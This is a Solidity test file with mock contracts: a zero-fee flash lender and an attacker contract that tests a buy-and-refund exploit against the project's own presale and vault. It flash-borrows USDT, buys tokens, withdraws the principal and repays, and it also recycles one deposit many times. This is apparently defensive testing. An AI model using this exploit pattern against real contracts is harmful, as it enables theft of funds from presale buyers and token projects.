// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "../Token.sol";
import "../VaultContractV2.sol";

interface IFlashBorrowerMock {
    function onFlashLoan(uint256 amount, bytes calldata data) external;
}

/// @dev Test double: zero-fee flash lender (Aave/Balancer style) for any ERC20 it holds.
contract FlashLenderMock {
    using SafeERC20 for IERC20;
    IERC20 public immutable token;

    constructor(IERC20 t) {
        token = t;
    }

    function flashLoan(IFlashBorrowerMock receiver, uint256 amount, bytes calldata data) external {
        uint256 before = token.balanceOf(address(this));
        token.safeTransfer(address(receiver), amount);
        receiver.onFlashLoan(amount, data);
        require(token.balanceOf(address(this)) >= before, "flash loan not repaid");
    }
}

/// @dev Test double for the buy-and-refund attack: tries to get presale SLF and the USDT back.
contract PresaleFreeRiderMock is IFlashBorrowerMock {
    using SafeERC20 for IERC20;

    IERC20 public immutable usdt;
    ProjectTokenPresale public immutable presale;
    VaultContractV2 public immutable vault;
    FlashLenderMock public immutable lender;
    address public immutable beneficiary;

    constructor(
        IERC20 _usdt,
        ProjectTokenPresale _presale,
        VaultContractV2 _vault,
        FlashLenderMock _lender,
        address _beneficiary
    ) {
        usdt = _usdt;
        presale = _presale;
        vault = _vault;
        lender = _lender;
        beneficiary = _beneficiary;
    }

    /// One transaction, zero capital: flash-borrow USDT, buy(), withdrawPrincipal(), repay.
    function attackWithFlashLoan(uint256 amount) external {
        lender.flashLoan(this, amount, "");
        IERC20(address(presale)).safeTransfer(beneficiary, presale.balanceOf(address(this)));
    }

    function onFlashLoan(uint256 amount, bytes calldata) external {
        require(msg.sender == address(lender), "only lender");
        usdt.forceApprove(address(presale), amount);
        presale.buy(amount);
        uint256 idx = vault.getUserDeposits(address(this)).length - 1;
        vault.withdrawPrincipal(idx);
        usdt.safeTransfer(address(lender), amount);
    }

    /// Deposit and immediately withdraw the same USDT `times` times in one transaction.
    function recycleDeposits(uint256 amount, uint256 times) external {
        usdt.forceApprove(address(vault), type(uint256).max);
        uint256 start = vault.getUserDeposits(address(this)).length;
        for (uint256 i = 0; i < times; i++) {
            vault.deposit(amount);
            vault.withdrawPrincipal(start + i);
        }
        IERC20(address(presale)).safeTransfer(beneficiary, presale.balanceOf(address(this)));
        usdt.safeTransfer(beneficiary, usdt.balanceOf(address(this)));
    }
}
